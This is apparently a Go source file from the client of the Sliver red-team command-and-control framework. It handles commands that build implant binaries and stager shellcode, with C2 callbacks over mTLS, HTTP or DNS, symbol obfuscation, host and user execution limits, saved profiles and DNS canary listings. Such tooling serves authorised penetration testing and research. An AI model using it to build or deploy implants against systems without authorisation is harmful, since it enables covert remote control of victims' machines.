package command

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/spin"
	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

var validFormats = []string{
	"bash",
	"c",
	"csharp",
	"dw",
	"dword",
	"hex",
	"java",
	"js_be",
	"js_le",
	"num",
	"perl",
	"pl",
	"powershell",
	"ps1",
	"py",
	"python",
	"raw",
	"rb",
	"ruby",
	"sh",
	"vbapplication",
	"vbscript",
}

func generate(ctx *grumble.Context, rpc RPCServer) {
	config := parseCompileFlags(ctx)
	if config == nil {
		return
	}
	save := ctx.Flags.String("save")
	if save == "" {
		save, _ = os.Getwd()
	}
	compile(config, save, rpc)
}

func regenerate(ctx *grumble.Context, rpc RPCServer) {
	if len(ctx.Args) < 1 {
		fmt.Printf(Warn+"Invalid sliver name, see `help %s`\n", consts.RegenerateStr)
		return
	}
	save := ctx.Flags.String("save")
	if save == "" {
		save, _ = os.Getwd()
	}

	regenerateReq, _ := proto.Marshal(&clientpb.Regenerate{
		SliverName: ctx.Args[0],
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgRegenerate,
		Data: regenerateReq,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return
	}

	regen := &clientpb.Regenerate{}
	proto.Unmarshal(resp.Data, regen)

	saveTo, _ := filepath.Abs(save)
	fi, err := os.Stat(saveTo)
	if err != nil {
		fmt.Printf(Warn+"Failed to regenerate sliver %s\n", err)
		return
	}
	if regen.File == nil {
		fmt.Printf(Warn + "Failed to regenerate sliver (no data)\n")
		return
	}

	if fi.IsDir() {
		var fileName string
		if 0 < len(regen.File.Name) {
			fileName = path.Base(regen.File.Name)
		} else {
			fileName = path.Base(ctx.Args[0])
		}
		saveTo = filepath.Join(saveTo, fileName)
	}
	err = ioutil.WriteFile(saveTo, regen.File.Data, os.ModePerm)
	if err != nil {
		fmt.Printf(Warn+"Failed to write to %s\n", err)
		return
	}
	fmt.Printf(Info+"Sliver binary saved to: %s\n", saveTo)
}

func generateEgg(ctx *grumble.Context, rpc RPCServer) {
	outFmt := ctx.Flags.String("output-format")
	validFmt := false
	for _, f := range validFormats {
		if f == outFmt {
			validFmt = true
			break
		}
	}
	if !validFmt {
		fmt.Printf(Warn+"Invalid output format: %s", outFmt)
		return
	}
	stagingURL := ctx.Flags.String("listener-url")
	if stagingURL == "" {
		return
	}
	save := ctx.Flags.String("save")
	config := parseCompileFlags(ctx)
	if config == nil {
		return
	}
	config.Format = clientpb.SliverConfig_SHELLCODE
	config.IsSharedLib = true
	// Find job type (tcp / http)
	u, err := url.Parse(stagingURL)
	if err != nil {
		fmt.Printf(Warn + "listener-url format not supported")
		return
	}
	port, err := strconv.Atoi(u.Port())
	if err != nil {
		fmt.Printf(Warn+"Invalid port number: %s", err.Error())
		return
	}
	eggConfig := &clientpb.EggConfig{
		Host:   u.Hostname(),
		Port:   uint32(port),
		Arch:   config.GOARCH,
		Format: outFmt,
	}
	switch u.Scheme {
	case "tcp":
		eggConfig.Protocol = clientpb.EggConfig_TCP
	case "http":
		eggConfig.Protocol = clientpb.EggConfig_HTTP
	case "https":
		eggConfig.Protocol = clientpb.EggConfig_HTTPS
	default:
		eggConfig.Protocol = clientpb.EggConfig_TCP
	}
	ctrl := make(chan bool)
	go spin.Until("Creating stager shellcode...", ctrl)
	data, _ := proto.Marshal(&clientpb.EggRequest{
		EConfig: eggConfig,
		Config:  config,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgEggReq,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	if resp.Err != "" {
		fmt.Printf(Warn+"%s", resp.Err)
		return
	}
	eggResp := &clientpb.Egg{}
	err = proto.Unmarshal(resp.Data, eggResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	// Don't display raw shellcode out stdout
	if save != "" || outFmt == "raw" {
		// Save it to disk
		saveTo, _ := filepath.Abs(save)
		fi, err := os.Stat(saveTo)
		if err != nil {
			fmt.Printf(Warn+"Failed to generate sliver egg %v\n", err)
			return
		}
		if fi.IsDir() {
			saveTo = filepath.Join(saveTo, eggResp.Filename)
		}
		err = ioutil.WriteFile(saveTo, eggResp.Data, os.ModePerm)
		if err != nil {
			fmt.Printf(Warn+"Failed to write to: %s\n", saveTo)
			return
		}
		fmt.Printf(Info+"Sliver egg saved to: %s\n", saveTo)
	} else {
		// Display shellcode to stdout
		fmt.Println("\n" + Info + "Here's your Egg:")
		fmt.Println(string(eggResp.Data))
	}
	fmt.Printf("\n"+Info+"Successfully started job #%d\n", eggResp.JobID)
}

// Shared function that extracts the compile flags from the grumble context
func parseCompileFlags(ctx *grumble.Context) *clientpb.SliverConfig {
	targetOS := strings.ToLower(ctx.Flags.String("os"))
	arch := strings.ToLower(ctx.Flags.String("arch"))

	c2s := []*clientpb.SliverC2{}

	mtlsC2 := parseMTLSc2(ctx.Flags.String("mtls"))
	c2s = append(c2s, mtlsC2...)

	httpC2 := parseHTTPc2(ctx.Flags.String("http"))
	c2s = append(c2s, httpC2...)

	dnsC2 := parseDNSc2(ctx.Flags.String("dns"))
	c2s = append(c2s, dnsC2...)

	var symbolObfuscation bool
	if ctx.Flags.Bool("debug") {
		symbolObfuscation = false
	} else {
		symbolObfuscation = !ctx.Flags.Bool("skip-symbols")
	}

	if len(mtlsC2) == 0 && len(httpC2) == 0 && len(dnsC2) == 0 {
		fmt.Printf(Warn + "Must specify at least one of --mtls, --http, or --dns\n")
		return nil
	}

	rawCanaries := ctx.Flags.String("canary")
	canaryDomains := []string{}
	if 0 < len(rawCanaries) {
		for _, canaryDomain := range strings.Split(rawCanaries, ",") {
			if !strings.HasSuffix(canaryDomain, ".") {
				canaryDomain += "." // Ensure we have the FQDN
			}
			canaryDomains = append(canaryDomains, canaryDomain)
		}
	}

	reconnectInverval := ctx.Flags.Int("reconnect")
	maxConnectionErrors := ctx.Flags.Int("max-errors")

	limitDomainJoined := ctx.Flags.Bool("limit-domainjoined")
	limitHostname := ctx.Flags.String("limit-hostname")
	limitUsername := ctx.Flags.String("limit-username")
	limitDatetime := ctx.Flags.String("limit-datetime")

	isSharedLib := false

	format := ctx.Flags.String("format")
	var configFormat clientpb.SliverConfig_OutputFormat
	switch format {
	case "exe":
		configFormat = clientpb.SliverConfig_EXECUTABLE
	case "shared":
		configFormat = clientpb.SliverConfig_SHARED_LIB
		isSharedLib = true
	case "shellcode":
		configFormat = clientpb.SliverConfig_SHELLCODE
		isSharedLib = true
	default:
		// default to exe
		configFormat = clientpb.SliverConfig_EXECUTABLE
	}
	/* For UX we convert some synonymous terms */
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" || targetOS == "osx" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	config := &clientpb.SliverConfig{
		GOOS:             targetOS,
		GOARCH:           arch,
		Debug:            ctx.Flags.Bool("debug"),
		ObfuscateSymbols: symbolObfuscation,
		C2:               c2s,
		CanaryDomains:    canaryDomains,

		ReconnectInterval:   uint32(reconnectInverval),
		MaxConnectionErrors: uint32(maxConnectionErrors),

		LimitDomainJoined: limitDomainJoined,
		LimitHostname:     limitHostname,
		LimitUsername:     limitUsername,
		LimitDatetime:     limitDatetime,

		Format:      configFormat,
		IsSharedLib: isSharedLib,
	}

	return config
}

func parseMTLSc2(args string) []*clientpb.SliverC2 {
	c2s := []*clientpb.SliverC2{}
	if args == "" {
		return c2s
	}
	for index, arg := range strings.Split(args, ",") {
		uri := url.URL{Scheme: "mtls"}
		uri.Host = arg
		if uri.Port() == "" {
			uri.Host = fmt.Sprintf("%s:%d", uri.Host, defaultMTLSLPort)
		}
		c2s = append(c2s, &clientpb.SliverC2{
			Priority: uint32(index),
			URL:      uri.String(),
		})
	}
	return c2s
}

func parseHTTPc2(args string) []*clientpb.SliverC2 {
	c2s := []*clientpb.SliverC2{}
	if args == "" {
		return c2s
	}
	for index, arg := range strings.Split(args, ",") {
		arg = strings.ToLower(arg)
		var uri *url.URL
		var err error
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			uri, err = url.Parse(arg)
			if err != nil {
				log.Printf("Failed to parse c2 URL %v", err)
				continue
			}
		} else {
			uri = &url.URL{Scheme: "https"} // HTTPS is the default, will fallback to HTTP
			uri.Host = arg
		}
		c2s = append(c2s, &clientpb.SliverC2{
			Priority: uint32(index),
			URL:      uri.String(),
		})
	}
	return c2s
}

func parseDNSc2(args string) []*clientpb.SliverC2 {
	c2s := []*clientpb.SliverC2{}
	if args == "" {
		return c2s
	}
	for index, arg := range strings.Split(args, ",") {
		uri := url.URL{Scheme: "dns"}
		if len(arg) < 1 {
			continue
		}
		// Make sure we have the FQDN
		if !strings.HasSuffix(arg, ".") {
			arg += "."
		}
		if strings.HasPrefix(arg, ".") {
			arg = arg[1:]
		}

		uri.Host = arg
		c2s = append(c2s, &clientpb.SliverC2{
			Priority: uint32(index),
			URL:      uri.String(),
		})
	}
	return c2s
}

func profileGenerate(ctx *grumble.Context, rpc RPCServer) {
	name := ctx.Flags.String("name")
	if name == "" && 1 <= len(ctx.Args) {
		name = ctx.Args[0]
	}
	save := ctx.Flags.String("save")
	if save == "" {
		save, _ = os.Getwd()
	}
	profiles := getSliverProfiles(rpc)
	if profile, ok := (*profiles)[name]; ok {
		compile(profile.Config, save, rpc)
	} else {
		fmt.Printf(Warn+"No profile with name '%s'", name)
	}
}

func compile(config *clientpb.SliverConfig, save string, rpc RPCServer) {

	fmt.Printf(Info+"Generating new %s/%s Sliver binary\n", config.GOOS, config.GOARCH)

	if config.ObfuscateSymbols {
		fmt.Printf(Info + "Symbol obfuscation is enabled, this process takes about 15 minutes\n")
	} else if !config.Debug {
		fmt.Printf(Warn+"Symbol obfuscation is %sdisabled%s\n", bold, normal)
	}

	start := time.Now()
	ctrl := make(chan bool)
	go spin.Until("Compiling, please wait ...", ctrl)

	generateReq, _ := proto.Marshal(&clientpb.GenerateReq{Config: config})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgGenerate,
		Data: generateReq,
	}, 45*time.Minute)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return
	}
	end := time.Now()
	elapsed := time.Time{}.Add(end.Sub(start))
	fmt.Printf(clearln+Info+"Build completed in %s\n", elapsed.Format("15:04:05"))

	generated := &clientpb.Generate{}
	proto.Unmarshal(resp.Data, generated)

	saveTo, _ := filepath.Abs(save)
	fi, err := os.Stat(saveTo)
	if err != nil {
		fmt.Printf(Warn+"Failed to generate sliver %v\n", err)
		return
	}
	if len(generated.File.Data) == 0 {
		fmt.Printf(Warn + "Build failed, no file data\n")
		return
	}
	if fi.IsDir() {
		saveTo = filepath.Join(saveTo, path.Base(generated.File.Name))
	}
	err = ioutil.WriteFile(saveTo, generated.File.Data, os.ModePerm)
	if err != nil {
		fmt.Printf(Warn+"Failed to write to: %s\n", saveTo)
		return
	}
	fmt.Printf(Info+"Sliver binary saved to: %s\n", saveTo)
}

func profiles(ctx *grumble.Context, rpc RPCServer) {
	profiles := getSliverProfiles(rpc)
	if profiles == nil {
		return
	}
	if len(*profiles) == 0 {
		fmt.Printf(Info+"No profiles, create one with `%s`\n", consts.NewProfileStr)
		return
	}
	table := tabwriter.NewWriter(os.Stdout, 0, 2, 2, ' ', 0)
	fmt.Fprintf(table, "Name\tPlatform\tCommand & Control\tDebug\tLimitations\t\n")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("Name")),
		strings.Repeat("=", len("Platform")),
		strings.Repeat("=", len("Command & Control")),
		strings.Repeat("=", len("Debug")),
		strings.Repeat("=", len("Limits")))

	for name, profile := range *profiles {
		config := profile.Config
		fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\n",
			name,
			fmt.Sprintf("%s/%s", config.GOOS, config.GOARCH),
			fmt.Sprintf("[1] %s", config.C2[0].URL),
			fmt.Sprintf("%v", config.Debug),
			getLimitsString(config),
		)
		if 1 < len(config.C2) {
			for index, c2 := range config.C2[1:] {
				fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\n",
					"",
					"",
					fmt.Sprintf("[%d] %s", index+2, c2.URL),
					"",
					"",
				)
			}
		}
		fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\n", "", "", "", "", "")
	}
	table.Flush()
}

func getLimitsString(config *clientpb.SliverConfig) string {
	limits := []string{}
	if config.LimitDatetime != "" {
		limits = append(limits, fmt.Sprintf("datetime=%s", config.LimitDatetime))
	}
	if config.LimitDomainJoined {
		limits = append(limits, fmt.Sprintf("domainjoined=%v", config.LimitDomainJoined))
	}
	if config.LimitUsername != "" {
		limits = append(limits, fmt.Sprintf("username=%s", config.LimitUsername))
	}
	if config.LimitHostname != "" {
		limits = append(limits, fmt.Sprintf("hostname=%s", config.LimitHostname))
	}
	return strings.Join(limits, "; ")
}

func newProfile(ctx *grumble.Context, rpc RPCServer) {
	name := ctx.Flags.String("name")
	if name == "" {
		fmt.Printf(Warn + "Invalid profile name\n")
		return
	}

	config := parseCompileFlags(ctx)
	if config == nil {
		return
	}

	data, _ := proto.Marshal(&clientpb.Profile{
		Name:   name,
		Config: config,
	})

	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgNewProfile,
		Data: data,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf(Info + "Saved new profile\n")
	}
}

func getSliverProfiles(rpc RPCServer) *map[string]*clientpb.Profile {
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgProfiles,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return nil
	}

	pbProfiles := &clientpb.Profiles{}
	err := proto.Unmarshal(resp.Data, pbProfiles)
	if err != nil {
		fmt.Printf(Warn+"Error %s", err)
		return nil
	}

	profiles := &map[string]*clientpb.Profile{}
	for _, profile := range pbProfiles.List {
		(*profiles)[profile.Name] = profile
	}
	return profiles
}

func canaries(ctx *grumble.Context, rpc RPCServer) {
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgListCanaries,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return
	}

	canaries := &clientpb.Canaries{}
	proto.Unmarshal(resp.Data, canaries)
	if 0 < len(canaries.Canaries) {
		displayCanaries(canaries.Canaries, ctx.Flags.Bool("burned"))
	} else {
		fmt.Printf(Info + "No canaries in database\n")
	}
}

func displayCanaries(canaries []*clientpb.DNSCanary, burnedOnly bool) {

	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	fmt.Fprintf(table, "Sliver Name\tDomain\tTriggered\tFirst Trigger\tLatest Trigger\t\n")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("Sliver Name")),
		strings.Repeat("=", len("Domain")),
		strings.Repeat("=", len("Triggered")),
		strings.Repeat("=", len("First Trigger")),
		strings.Repeat("=", len("Latest Trigger")),
	)

	lineColors := []string{}
	for _, canary := range canaries {
		if burnedOnly && !canary.Triggered {
			continue
		}
		fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t\n",
			canary.SliverName,
			canary.Domain,
			fmt.Sprintf("%v", canary.Triggered),
			canary.FristTriggered,
			canary.LatestTrigger,
		)
		if canary.Triggered {
			lineColors = append(lineColors, bold+red)
		} else {
			lineColors = append(lineColors, normal)
		}
	}
	table.Flush()

	for index, line := range strings.Split(outputBuf.String(), "\n") {
		if len(line) == 0 {
			continue
		}
		// We need to account for the two rows of column headers
		if 0 < len(line) && 2 <= index {
			lineColor := lineColors[index-2]
			fmt.Printf("%s%s%s\n", lineColor, line, normal)
		} else {
			fmt.Printf("%s\n", line)
		}
	}
}
